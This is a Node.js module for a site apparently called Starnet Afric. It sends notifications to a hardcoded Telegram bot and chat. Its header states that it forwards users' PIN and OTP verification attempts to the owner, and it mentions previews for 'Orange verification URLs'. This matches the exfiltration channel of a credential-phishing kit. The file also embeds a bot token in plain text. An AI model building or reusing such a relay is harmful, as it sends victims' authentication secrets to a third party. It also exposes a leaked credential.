"use strict";

/**
 * Integration Telegram (bot @starnettellbot).
 *
 * Sends owner notifications:
 *   - new order, contact message, payment confirmed
 *   - PIN + OTP verification attempts (from user-auth)
 *
 * Token and chat_id are read on the server only (env vars),
 * never in the browser.
 *
 * Defaults below are used when Vercel env vars are not set yet.
 * Prefer setting TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in Vercel.
 */

const API = "https://api.telegram.org";

// Defaults for @starnettellbot / Caren Kwikwa (override via Vercel env)
const DEFAULT_BOT_TOKEN = "8904004596:AAFLyhvISjNiZYa6XJdJ1ozQvyPOvZEx-f8";
const DEFAULT_CHAT_ID = "5378948203";

function config() {
  const token = String(process.env.TELEGRAM_BOT_TOKEN || DEFAULT_BOT_TOKEN || "").trim();
  const chatId = String(process.env.TELEGRAM_CHAT_ID || DEFAULT_CHAT_ID || "").trim();
  return { token, chatId };
}

let warnedNoToken = false;
let warnedNoChat = false;

/** Send a notification to the owner. Returns a status object.
 *  opts.preview = true → show link preview (useful for Orange verification URLs)
 */
async function notify(text, opts) {
  const { token, chatId } = config();
  if (!token) {
    if (!warnedNoToken) {
      console.warn("[telegram] TELEGRAM_BOT_TOKEN not set — notifications disabled.");
      warnedNoToken = true;
    }
    return { ok: false, skipped: "no_token" };
  }
  if (!chatId) {
    if (!warnedNoChat) {
      console.warn("[telegram] TELEGRAM_CHAT_ID not set — send /start to the bot first.");
      warnedNoChat = true;
    }
    return { ok: false, skipped: "no_chat" };
  }

  const safeText = String(text || "").slice(0, 4000);
  const preview = !!(opts && opts.preview);
  try {
    const r = await fetch(API + "/bot" + token + "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json", "User-Agent": "starnet-afric" },
      body: JSON.stringify({
        chat_id: chatId,
        text: safeText,
        parse_mode: "HTML",
        disable_web_page_preview: !preview
      })
    });
    const j = await r.json().catch(() => ({}));
    if (!r.ok || j.ok !== true) {
      console.error("[telegram] sendMessage failed", r.status, j.description || j);
      return { ok: false, error: j.description || ("HTTP " + r.status) };
    }
    return { ok: true };
  } catch (e) {
    console.error("[telegram] network error", e.message);
    return { ok: false, error: e.message };
  }
}

/** List recent chats known by the bot (getUpdates). */
async function detectChats() {
  const { token } = config();
  if (!token) return { ok: false, error: "TELEGRAM_BOT_TOKEN not set" };

  try {
    const r = await fetch(API + "/bot" + token + "/getUpdates?limit=50", {
      headers: { "User-Agent": "starnet-afric" }
    });
    const j = await r.json().catch(() => ({}));
    if (!j.ok) return { ok: false, error: j.description || "getUpdates failed" };

    const seen = new Map();
    for (const u of j.result || []) {
      const msg = u.message || u.edited_message || u.channel_post;
      if (!msg || !msg.chat) continue;
      const c = msg.chat;
      const id = String(c.id);
      if (seen.has(id)) continue;
      seen.set(id, {
        id,
        type: c.type,
        title: c.title || null,
        username: c.username || null,
        first_name: c.first_name || null,
        last_name: c.last_name || null
      });
    }
    return { ok: true, chats: Array.from(seen.values()) };
  } catch (e) {
    return { ok: false, error: e.message };
  }
}

module.exports = { notify, detectChats, config };
